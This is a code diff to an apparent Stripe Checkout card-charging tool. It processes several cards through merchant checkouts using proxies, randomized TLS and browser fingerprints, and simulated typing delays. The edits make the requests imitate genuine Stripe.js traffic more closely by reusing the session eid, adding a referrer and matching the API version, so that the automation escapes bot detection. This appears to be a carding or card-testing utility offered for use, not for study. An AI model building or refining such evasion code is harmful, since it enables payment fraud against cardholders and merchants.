@@ -151,6 +151,7 @@ async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str =
             bp = get_random_browser_profile()
             init_tls = tls_profile or bp['tls']
             eid = generate_eid()
+            result["eid"] = eid  # Save for reuse in confirm
             body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"
 
             headers = get_stripe_headers()
@@ -171,6 +172,7 @@ async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str =
 
             if "error" not in init_data:
                 result["init_data"] = init_data
+                result["api_version"] = init_data.get("api_version", "2025-02-24.acacia")
 
                 acc = init_data.get("account_settings", {})
                 result["merchant"] = acc.get("display_name") or acc.get("business_name")
@@ -331,8 +333,12 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
 
-                # Only eid changes per card (unique per request)
-                eid = generate_eid()
+                # Reuse eid from init for first card (browser behavior)
+                # Only generate new eid for retry/subsequent cards
+                if card_index == 0:
+                    eid = checkout_data.get("eid") or generate_eid()
+                else:
+                    eid = generate_eid()
 
                 # Realistic delay before confirm — mimic user typing card details
                 # First card: longer (reading page), subsequent: faster
@@ -367,6 +373,9 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 # Add pasted_fields only if not empty
                 if pasted:
                     conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+                # Add referrer — real Stripe.js always sends this
+                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                conf_body += f"&payment_method_data[referrer]={checkout_url}"
                 conf_body += (
                     f"&expected_amount={total}"
                     f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
@@ -377,7 +386,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     f"&expected_payment_method_type=card"
                     f"&key={pk}"
                     f"&init_checksum={checksum}"
-                    f"&_stripe_version=2025-02-24.acacia"
+                    f"&_stripe_version={checkout_data.get('api_version', '2025-02-24.acacia')}"
                 )
 
                 # Use curl_cffi headers + matched UA + cookies
